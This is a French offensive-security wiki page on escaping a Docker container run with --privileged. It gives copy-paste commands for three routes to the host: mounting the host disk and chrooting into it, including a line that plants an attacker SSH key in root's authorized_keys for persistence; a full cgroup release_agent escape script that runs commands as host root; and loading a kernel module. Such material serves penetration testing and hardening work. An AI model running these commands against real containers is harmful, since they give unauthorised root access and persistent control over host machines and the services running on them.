---
title: "Flag privileged : accès total à l'hôte depuis un conteneur --privileged"
description: "S'évader d'un conteneur lancé avec --privileged, qui accorde toutes les capacités Linux, l'accès à chaque périphérique de l'hôte sous /dev, un profil seccomp et AppArmor non confiné, et un sysfs et cgroupfs accessibles en écriture. Trois voies concrètes vers l'hôte : monter le disque de l'hôte, le handler release_agent de cgroup, et charger un module noyau."
keywords:
  - conteneur privilégié
  - docker privileged
  - évasion de conteneur
  - montage du disque de l'hôte
  - release_agent
---

# Flag privileged

`--privileged` est l'évasion de conteneur la plus courante, et la plus facile. Il supprime d'un coup presque toutes les frontières : le conteneur reçoit l'ensemble complet des capacités, une règle de cgroup de périphériques de `a *:* rwm` (de sorte que chaque nœud de périphérique de l'hôte sous `/dev` est utilisable), un profil seccomp et un profil AppArmor non confinés, ainsi qu'un `/sys` et un cgroupfs en lecture-écriture. De l'intérieur, vous êtes de fait root sur l'hôte ; la seule question est laquelle de plusieurs voies vous empruntez pour sortir.

Confirmez-le en une ligne, puis choisissez une voie :

```bash
grep -q $'\t'0000003fffffffff /proc/self/status 2>/dev/null || grep CapEff /proc/self/status
ls /dev/sda* /dev/nvme* 2>/dev/null       # host block devices are visible under --privileged
```

## Voie 1 : monter le disque de l'hôte

La voie interactive la plus rapide. Avec un accès complet aux périphériques, vous montez simplement le périphérique bloc racine de l'hôte et y effectuez chroot :

```bash
# Identify the host root filesystem device
fdisk -l 2>/dev/null | grep -E 'Linux|/dev'      # or: lsblk, cat /proc/partitions
# Mount it and become root on the host filesystem
mkdir -p /mnt/host && mount /dev/sda1 /mnt/host && chroot /mnt/host sh
# From here, read/write any host file; drop an SSH key or systemd unit for persistence
echo 'ssh-ed25519 AAAA... attacker' >> /mnt/host/root/.ssh/authorized_keys
```

Pour les racines sur LVM ou chiffrées, le périphérique est le nœud mapper (`/dev/mapper/...`) ; `lsblk -f` montre le système de fichiers et le point de montage pour choisir le bon.

## Voie 2 : release_agent de cgroup

L'instruction unique non interactive la plus fiable, indépendante de l'agencement du disque. Elle fonctionne sur cgroup v1 (présent sur la plupart des hôtes, ou montable sous `--privileged`). Le noyau exécute le programme `release_agent`, dans les espaces de noms de l'hôte en tant que root, lorsque la dernière tâche quitte un cgroup marqué `notify_on_release` :

```bash
mkdir /tmp/c && mount -t cgroup -o rdma cgroup /tmp/c && mkdir /tmp/c/x
echo 1 > /tmp/c/x/notify_on_release
# release_agent runs in the HOST mount namespace: locate this container's rootfs on the host
host=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
echo "$host/cmd" > /tmp/c/release_agent
printf '#!/bin/sh\nid > %s/out 2>&1\n' "$host" > /cmd && chmod +x /cmd
# Fire it: a task that enters then exits the cgroup empties it
sh -c "echo \$\$ > /tmp/c/x/cgroup.procs"
cat /out        # output of id, run as root on the host
```

L'astuce `upperdir` est nécessaire car `release_agent` s'exécute dans la vue du système de fichiers de l'hôte, de sorte que l'assistant doit se trouver à un chemin que l'hôte peut résoudre. Voir [cgroups release_agent](cgroups-release-agent.md) pour la technique complète et la réserve concernant cgroup v2.

## Voie 3 : charger un module noyau

Si vous préférez le ring 0 directement (utile lorsque le montage du disque est malcommode ou que vous voulez désactiver des défenses), l'ensemble complet des capacités inclut `CAP_SYS_MODULE` ; compilez et insérez un module dont l'init lance un processus de l'hôte. Voir [CAP_SYS_MODULE](capability-abuse/cap-sys-module.md).

## Notes d'exploitation

- `--privileged` est un sur-ensemble : tout ce qui relève de [Abus de capacité](capability-abuse/index.md), [Accès aux périphériques](device-access/index.md) et [cgroups release_agent](cgroups-release-agent.md) est disponible. La voie 1 est la plus rapide pour un shell ; la voie 2 est la plus facile à copier-coller et ne dépend pas de la connaissance du périphérique disque.
- Sur un hôte uniquement en cgroup v2 (aucune hiérarchie v1 à monter), le `mount -t cgroup` de la voie 2 échoue ; repliez-vous sur la voie 1 (disque) ou la voie 3 (module). Vérifiez avec `mount | grep cgroup2` et l'absence de fichiers `release_agent`.
- Ces voies s'exécutent en tant que vrai root sur l'hôte uniquement lorsque le conteneur n'est pas dans un espace de noms utilisateur ; `cat /proc/self/uid_map` affichant `0 0 4294967295` le confirme, ce qui est le défaut pour Docker en mode rootful et la plupart des pods Kubernetes.
- Dans Kubernetes, cela correspond à `securityContext.privileged: true` ; obtenir un tel pod relève de [Création de pod vers le nœud](../../orchestration/kubernetes/rbac-privilege-escalation/pod-creation-to-node.md), et la vue de livraison est [Pod privilégié](../../orchestration/kubernetes/pod-escape-to-node/privileged-pod.md).

## Références

- [Docker : runtime privilege and Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [Trail of Bits : Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [man 7 cgroups](https://man7.org/linux/man-pages/man7/cgroups.7.html)
